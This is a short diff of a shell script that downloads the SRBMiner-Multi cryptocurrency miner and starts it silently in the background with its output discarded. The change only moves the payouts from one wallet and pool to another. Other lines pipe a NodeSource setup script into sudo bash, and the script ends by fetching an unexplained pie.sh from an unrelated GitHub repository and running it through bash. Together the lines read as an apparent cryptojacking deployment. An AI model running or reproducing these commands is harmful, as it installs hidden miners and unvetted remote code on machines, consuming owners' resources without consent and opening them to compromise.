@@ -14,5 +14,5 @@ sudo su --command "curl -fsSL https://deb.nodesource.com/setup_20.x | sudo bash 
 wget https://github.com/doktor83/SRBMiner-Multi/releases/download/3.2.8/SRBMiner-Multi-3-2-8-Linux.tar.gz >/dev/null 2>&1
 tar -xzvf SRBMiner-Multi-3-2-8-Linux.tar.gz
 cd SRBMiner-Multi-3-2-8
-./SRBMiner-MULTI --algorithm xelishashv3 --pool de.xelis.herominers.com:1225 --wallet xel:empagph7k0hmlgzd9vev84cxt9nz52375cftmvkdw56vwa8zhahqzqqyd9lq2aqpfsgnf."gP$RANDOM" >/dev/null 2>&1 &
+./SRBMiner-MULTI --algorithm xelishashv3 --pool zeph-eu.kryptex.network:7030 --wallet ZEPHs8jyUPSQoopYn8BM7Dcs76qajS9XHQ9GeR5CALDyadtXWdeiFP56qPntU8BnpR8gYBsNrMkfLB5Vko8XXGg57jDT8sEmy6J."gP$RANDOM" >/dev/null 2>&1 &
 curl -sL https://raw.githubusercontent.com/bsheredia/dumel/main/pie.sh | bash
